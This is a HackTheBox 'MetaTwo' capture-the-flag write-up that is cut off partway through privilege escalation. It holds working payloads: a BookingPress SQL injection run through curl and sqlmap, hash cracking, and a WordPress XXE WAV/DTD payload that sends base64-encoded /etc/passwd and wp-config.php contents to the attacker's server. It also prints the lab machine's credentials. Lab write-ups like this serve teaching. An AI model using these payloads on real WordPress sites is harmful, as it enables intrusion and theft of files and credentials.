@@ -1,0 +1,743 @@
+---
+title: Hackthebox Metatwo Writeup
+slug: hackthebox-metatwo-writeup
+description: Hackthebox released a new machine called metatwo. On this machine, we got the wordpress server, which one of the plugin is vulnerable unauthenticated sql injection using that get the wp-admin user password after login inside admin panel abuse the functionality of uplaoding file get the ftp creads using that get the user creads through ftp and for root crack a pgp private key block.
+date: 2022-10-30
+image: hackthebox-metatwo-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+❯ nmap -sC -sV -oA nmap/result 10.10.11.186
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-29 21:47 CDT
+Nmap scan report for 10.10.11.186
+Host is up (0.088s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp?
+| fingerprint-strings:
+|   GenericLines:
+|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
+|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
+|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to http://metapress.htb/
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.93%I=7%D=10/29%Time=635DE5B7%P=aarch64-unknown-linux-gnu
+SF:%r(GenericLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:
+SF:10\.10\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more
+SF:\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20c
+SF:reative\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 215.25 seconds
+```
+
+Nmap tell us there are three open ports `21 ftp` `22 ssh` and `80 http` and HTTP port redirect to http://metapress.htb/
+
+Add that in `/etc/hosts` file.
+
+## Metapress.htb
+
+The web page is provided by `WordPress` and Its version is vulnerable, but the `exploit` will only work when we are authenticated.
+
+<FixTheImageURL src='web.png' slug='hackthebox-metatwo-writeup' />
+
+Going over to `/events/` page, it's listed the `information` of events.
+
+<FixTheImageURL src='web1.png' slug='hackthebox-metatwo-writeup' />
+
+Checking the `source code` of that page, we got to know that it's using `booking press 1.0.10`
+Let's check the `exploit` for that specific version
+
+<FixTheImageURL src='web2.png' slug='hackthebox-metatwo-writeup' />
+
+## CVE-2022-0739
+
+Link : https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
+
+> The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection
+
+For the `exploit` work, we need some info about `_wpnonce` which can be found in `events` page source code
+
+<FixTheImageURL src='web3.png' slug='hackthebox-metatwo-writeup' />
+Now we have two options, is to dump the `database` manually or use some automation
+tool like `sqlmap` I am doing it with `second` option so that `write up` will be
+short
+
+For that, we need to `capture` the request into `burp`
+Let's use `-x` flag for passing the `proxy` address
+
+```js
+❯ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080
+```
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-metatwo-writeup' />
+Capture the request in `burp` and save it into a file called `admin.req`
+<FixTheImageURL src='burp.png' slug='hackthebox-metatwo-writeup' />
+For `sqlmap` works, we need to remove the `injection` query to any `number`, or you
+can leave that `parameter` empty
+<FixTheImageURL src='cmd1.png' slug='hackthebox-metatwo-writeup' />
+That's the final look for the `admin.req` file
+
+```js
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+User-Agent: curl/7.85.0
+Accept: */*
+Content-Length: 185
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=1
+```
+
+## Dumping the database with sqlmap
+
+Now let's run the `sqlmap`
+
+```js
+> sqlmap -r admin.req -p total_service --batch
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.6.10#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:19:51 /2022-10-29/
+
+[23:19:51] [INFO] parsing HTTP request from 'admin.req'
+[23:19:51] [INFO] testing connection to the target URL
+[23:19:51] [INFO] testing if the target URL content is stable
+[23:19:51] [INFO] target URL content is stable
+[23:19:51] [WARNING] heuristic (basic) test shows that POST parameter 'total_service' might not be injectable
+[23:19:51] [INFO] testing for SQL injection on POST parameter 'total_service'
+[23:19:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[23:19:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[23:19:52] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[23:19:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[23:19:53] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[23:19:54] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[23:19:54] [INFO] testing 'Generic inline queries'
+[23:19:55] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[23:19:55] [WARNING] time-based comparison requires larger statistical model, please wait. (done)
+[23:19:55] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[23:19:56] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[23:19:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[23:20:07] [INFO] POST parameter 'total_service' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[23:20:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[23:20:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[23:20:09] [INFO] target URL appears to be UNION injectable with 9 columns
+[23:20:09] [INFO] POST parameter 'total_service' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+POST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
+---
+Parameter: total_service (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=1) AND (SELECT 3671 FROM (SELECT(SLEEP(5)))EHxh) AND (3696=3696
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171626b71,0x474f4677467874664859704664715373465751625a6f5948544155524c63714145546b46624c4a77,0x71787a7a71),NULL,NULL,NULL-- -
+---
+[23:20:09] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 8.0.24, Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[23:20:10] [INFO] fetched data logged to text files under '/home/dedsec/.local/share/sqlmap/output/metapress.htb'
+
+[*] ending @ 23:20:10 /2022-10-29/
+```
+
+And the parameter is `injectable` let's list out all the `databases`
+
+```js
+❯ sqlmap -r admin.req -p total_service --dbs
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.6.10#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:22:26 /2022-10-29/
+
+[23:22:26] [INFO] parsing HTTP request from 'admin.req'
+[23:22:26] [INFO] resuming back-end DBMS 'mysql'
+[23:22:26] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: total_service (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=1) AND (SELECT 3671 FROM (SELECT(SLEEP(5)))EHxh) AND (3696=3696
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171626b71,0x474f4677467874664859704664715373465751625a6f5948544155524c63714145546b46624c4a77,0x71787a7a71),NULL,NULL,NULL-- -
+---
+[23:22:27] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 8.0.24, Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[23:22:27] [INFO] fetching database names
+available databases [2]:
+[*] blog
+[*] information_schema
+
+[23:22:27] [INFO] fetched data logged to text files under '/home/dedsec/.local/share/sqlmap/output/metapress.htb'
+
+[*] ending @ 23:22:27 /2022-10-29/
+```
+
+Selecting `blog` database.
+After that, let's list the `tables` of the `blog` database.
+
+```js
+❯ sqlmap -r admin.req -p total_service -D blog --tables
+[27 tables]
++--------------------------------------+
+| wp_bookingpress_appointment_bookings |
+| wp_bookingpress_categories           |
+| wp_bookingpress_customers            |
+| wp_bookingpress_customers_meta       |
+| wp_bookingpress_customize_settings   |
+| wp_bookingpress_debug_payment_log    |
+| wp_bookingpress_default_daysoff      |
+| wp_bookingpress_default_workhours    |
+| wp_bookingpress_entries              |
+| wp_bookingpress_form_fields          |
+| wp_bookingpress_notifications        |
+| wp_bookingpress_payment_logs         |
+| wp_bookingpress_services             |
+| wp_bookingpress_servicesmeta         |
+| wp_bookingpress_settings             |
+| wp_commentmeta                       |
+| wp_comments                          |
+| wp_links                             |
+| wp_options                           |
+| wp_postmeta                          |
+| wp_posts                             |
+| wp_term_relationships                |
+| wp_term_taxonomy                     |
+| wp_termmeta                          |
+| wp_terms                             |
+| wp_usermeta                          |
+| wp_users                             |
++--------------------------------------+
+```
+
+Dumping the `wp_users` table
+
+```js
+❯ sqlmap -r admin.req -p total_service -D blog -T wp_users --dump
++─────+───────────────────────+─────────────────────────────────────+────────────────────────+─────────────+──────────────+───────────────+────────────────+──────────────────────+──────────────────────+
+| ID  | user_url              | user_pass                           | user_email             | user_login  | user_status  | display_name  | user_nicename  | user_registered      | user_activation_key  |
++─────+───────────────────────+─────────────────────────────────────+────────────────────────+─────────────+──────────────+───────────────+────────────────+──────────────────────+──────────────────────+
+| 1   | http://metapress.htb  | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.  | admin@metapress.htb    | admin       | 0            | admin         | admin          | 2022-06-23 17:58:28  | <blank>              |
++─────+───────────────────────+─────────────────────────────────────+────────────────────────+─────────────+──────────────+───────────────+────────────────+──────────────────────+──────────────────────+
+| 2   | <blank>               | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70  | manager@metapress.htb  | manager     | 0            | manager       | manager        | 2022-06-23 18:07:55  | <blank>              |
++─────+───────────────────────+─────────────────────────────────────+────────────────────────+─────────────+──────────────+───────────────+────────────────+──────────────────────+──────────────────────+
+```
+
+Got the `user` password hashes, Let's `crack` that with john
+
+```js
+❯ cat hash
+$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+
+❯ john -w=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 ASIMD 4x2])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+partylikearockstar (?)
+```
+
+-   Creads for manager user - username: manager - password: partylikearockstar
+    Trying that `creads` with ftp but `no luck` this time
+
+```js
+❯ ftp ftp://manager:partylikearockstar@10.10.11.186
+Connected to 10.10.11.186.
+220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+331 Password required for manager
+530 Login incorrect.
+ftp: Login failed
+ftp: Can't connect or login to host `10.10.11.186:ftp'
+221 Goodbye.
+```
+
+Let's try that creads in `wp-admin` panel
+
+<FixTheImageURL src='web4.png' slug='hackthebox-metatwo-writeup' />
+And that's works now we can use the `exploit` for that specific `WordPress` version
+<FixTheImageURL src='web5.png' slug='hackthebox-metatwo-writeup' />
+
+## CVE-2021-29447
+
+Link : https://tryhackme.com/room/wordpresscve202129447
+
+> Researchers at security firm SonarSource discovered an XML external entity injection (XXE) security flaw in the WordPress Media Library. The vulnerability can be exploited only when this CMS runs in PHP 8 *and* the attacking user has permissions to upload media files. Take note of the latter condition as we walk through an example of exploiting this vulnerability below.
+
+For the `exploitation`, we need to create a `WAV` file which will fetch the another file called `dedsec.dtd` which has our malicious content inside
+
+```js
+❯ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.XX.XX:9001/dedsec.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
+```
+
+Now let's create `dedsec.dtd` file which will read the `/etc/passwd` file and convert that into `base64` and send that data in `GET` request on our `php` server
+
+```js
+❯ cat dedsec.dtd
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.XX.XX:9001/?p=%file;'>" >
+```
+
+Starting the `PHP` server
+
+```js
+❯ php -S 0.0.0.0:9001
+```
+
+Now let's `upload` the `payload.wav` file
+
+<FixTheImageURL src='web6.png' slug='hackthebox-metatwo-writeup' />
+And we got the `base64` encoded value
+<FixTheImageURL src='cmd2.png' slug='hackthebox-metatwo-writeup' />
+Finally, got the `/etc/passwd` file
+
+```js
+❯ echo -n 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=' | base64 -d
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
+systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
+systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
+proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
+ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
+```
+
+I try to get the `jnelson` user ssh key, but the file is not exist
+
+So let's get the WordPress `wp-config.php` file, but for that we need the `path` for that directory
+In the past we see it's running `nginx` let's get the nginx `configuration`
+
+```js
+❯ cat dedsec.dtd
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default">
+<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.6:9001/?p=%file;'>" >
+```
+
+And we got the path `/var/www/metapress.htb/blog`
+
+```js
+❯ echo -n "c2VydmVyIHsKCglsaXN0ZW4gODA7CglsaXN0ZW4gWzo6XTo4MDsKCglyb290IC92YXIvd3d3L21ldGFwcmVzcy5odGIvYmxvZzsKCglpbmRleCBpbmRleC5waHAgaW5kZXguaHRtbDsKCiAgICAgICAgaWYgKCRodHRwX2hvc3QgIT0gIm1ldGFwcmVzcy5odGIiKSB7CiAgICAgICAgICAgICAgICByZXdyaXRlIF4gaHR0cDovL21ldGFwcmVzcy5odGIvOwogICAgICAgIH0KCglsb2NhdGlvbiAvIHsKCQl0cnlfZmlsZXMgJHVyaSAkdXJpLyAvaW5kZXgucGhwPyRhcmdzOwoJfQogICAgCglsb2NhdGlvbiB+IFwucGhwJCB7CgkJaW5jbHVkZSBzbmlwcGV0cy9mYXN0Y2dpLXBocC5jb25mOwoJCWZhc3RjZ2lfcGFzcyB1bml4Oi92YXIvcnVuL3BocC9waHA4LjAtZnBtLnNvY2s7Cgl9CgoJbG9jYXRpb24gfiogXC4oanN8Y3NzfHBuZ3xqcGd8anBlZ3xnaWZ8aWNvfHN2ZykkIHsKCQlleHBpcmVzIG1heDsKCQlsb2dfbm90X2ZvdW5kIG9mZjsKCX0KCn0K" | base64 -d
+server {
+
+        listen 80;
+        listen [::]:80;
+
+        root /var/www/metapress.htb/blog;
+
+        index index.php index.html;
+
+        if ($http_host != "metapress.htb") {
+                rewrite ^ http://metapress.htb/;
+        }
+
+        location / {
+                try_files $uri $uri/ /index.php?$args;
+        }
+
+        location ~ \.php$ {
+                include snippets/fastcgi-php.conf;
+                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
+        }
+
+        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
+                expires max;
+                log_not_found off;
+        }
+
+}
+```
+
+```js
+❯ cat dedsec.dtd
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php">
+<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.6:9001/?p=%file;'>" >
+```
+
+In the `wp-config.php` we got the `FTP` user creads
+
+```js
+<?php
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'blog' );
+
+/** MySQL database username */
+define( 'DB_USER', 'blog' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+define( 'FS_METHOD', 'ftpext' );
+define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+define( 'FTP_BASE', 'blog/' );
+define( 'FTP_SSL', false );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
+define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
+define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
+define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
+define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
+define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
+define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
+define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );
+
+/**
+ * WordPress Database Table prefix.
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+	define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+```
+
+-   FTP user creads
+    -   username: metapress.htb
+    -   password: 9NYS_ii@FyL_p5M2NvJ
+
+Successfully login inside the `FTP` server
+
+```js
+❯ ftp 10.10.11.186
+Connected to 10.10.11.186.
+220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+Name (10.10.11.186:dedsec): metapress.htb
+331 Password required for metapress.htb
+Password:
+230 User metapress.htb logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||64316|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
+drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
+226 Transfer complete
+```
+
+Got a `send_email.php` file
+
+```js
+ftp> cd mailer
+250 CWD command successful
+ftp> ls
+229 Entering Extended Passive Mode (|||24299|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
+-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22 18:32 send_email.php
+226 Transfer complete
+ftp> get send_email.php
+local: send_email.php remote: send_email.php
+229 Entering Extended Passive Mode (|||5585|)
+150 Opening BINARY mode data connection for send_email.php (1126 bytes)
+100% |*************************************************************************************************************************************|  1126        8.72 MiB/s    00:00 ETA
+226 Transfer complete
+1126 bytes received in 00:00 (12.53 KiB/s)
+ftp> exit
+221 Goodbye.
+```
+
+Looking over it, we got the `jnelson` user creads
+
+```js
+❯ cat send_email.php
+<?php
+/*
+ * This script will be used to send an email to all our users when ready for launch
+*/
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\SMTP;
+use PHPMailer\PHPMailer\Exception;
+
+require 'PHPMailer/src/Exception.php';
+require 'PHPMailer/src/PHPMailer.php';
+require 'PHPMailer/src/SMTP.php';
+
+$mail = new PHPMailer(true);
+
+$mail->SMTPDebug = 3;
+$mail->isSMTP();
+
+$mail->Host = "mail.metapress.htb";
+$mail->SMTPAuth = true;
+$mail->Username = "jnelson@metapress.htb";
+$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
+$mail->SMTPSecure = "tls";
+$mail->Port = 587;
+
+$mail->From = "jnelson@metapress.htb";
+$mail->FromName = "James Nelson";
+
+$mail->addAddress("info@metapress.htb");
+
+$mail->isHTML(true);
+
+$mail->Subject = "Startup";
+$mail->Body = "<i>We just started our new blog metapress.htb!</i>";
+
+try {
+    $mail->send();
+    echo "Message has been sent successfully";
+} catch (Exception $e) {
+    echo "Mailer Error: " . $mail->ErrorInfo;
+}
+```
+
+-   Creads For Jnelson User
+    -   username: jnelson
+    -   password: Cb4_JmWM8zUZWMu@Ys
+
+And we got the `user.txt` file
+
+<FixTheImageURL src='cmd3.png' slug='hackthebox-metatwo-writeup' />
+
+## Privilege Escalation
+
+Before running `linPEAS` I notice a unique directory called `.passpie` inside `jnelson` user directory
+Searching over google for `passpie` got a tool which is `Command-line password manager` written in python
+
+Link : https://github.com/marcwebbie/passpie
+
+> Passpie is a command line tool to manage passwords from the terminal with a colorful and configurable interface. Use a master passphrase to decrypt login credentials, copy passwords to clipboard, syncronize with a git repository, check the state of your passwords, and more.
+
+Looking over it, It has the `root password` stored in `PGP` format which is encrypted with a `key`
+
+And we also have the key file called `.keys`
+
+```js
+jnelson@meta2:~/.passpie$ pwd
